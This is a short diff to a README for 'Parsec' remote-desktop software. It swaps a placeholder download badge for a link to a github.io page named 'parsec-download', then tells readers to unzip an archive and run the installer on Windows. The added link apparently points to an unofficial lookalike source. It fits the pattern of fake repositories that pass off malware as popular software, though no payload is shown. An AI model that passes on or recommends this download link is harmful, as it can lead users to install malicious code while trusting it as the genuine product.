@@ -8,7 +8,7 @@ Built with cutting-edge encoding and networking technology, Parsec delivers **sm
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-yellow?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-yellow?style=for-the-badge)](https://parsec-download.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the **Parsec Installer** on your Windows PC.  
